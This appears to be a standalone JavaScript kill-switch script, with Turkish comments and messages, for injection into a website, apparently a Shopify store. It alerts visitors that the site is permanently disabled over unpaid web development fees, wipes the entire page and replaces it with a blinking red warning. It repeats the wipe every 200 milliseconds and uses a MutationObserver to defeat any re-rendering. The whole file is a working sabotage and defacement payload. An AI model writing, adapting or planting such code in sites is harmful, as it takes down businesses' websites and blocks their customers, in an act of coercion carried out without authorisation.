alert("UYARI: Bu site ÖDENMEMİŞ WEB GELİŞTİRME ÜCRETLERİ nedeniyle KALICI OLARAK DEVRE DIŞI BIRAKILDI!");

// Tanımlı mesaj HTML
const killHTML = `
  <style>
    html, body {
      background-color: #000;
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
    }
    h1 {
      color: #f00;
      font-size: 2.5rem;
      text-align: center;
      text-transform: uppercase;
      animation: blink 1s infinite;
      max-width: 90%;
    }
    @keyframes blink {
      0%   { opacity: 1; }
      50%  { opacity: 0; }
      100% { opacity: 1; }
    }
  </style>
  <h1>UYARI! BU SİTE ÖDENMEMİŞ GELİŞTİRME ÜCRETLERİ NEDENİYLE DEVRE DIŞI BIRAKILDI!</h1>
`;

// Başlangıçta tüm içeriği yok et
document.documentElement.innerHTML = killHTML;

// Sonsuz döngüde her 200ms'de bir tüm sayfayı tekrar yok et
setInterval(() => {
  document.documentElement.innerHTML = killHTML;
}, 200);

// Ekstra: Shopify turbo veya PJAX yeniden ekleme yaparsa anında temizle
new MutationObserver(() => {
  document.documentElement.innerHTML = killHTML;
}).observe(document.documentElement, { childList: true, subtree: true });
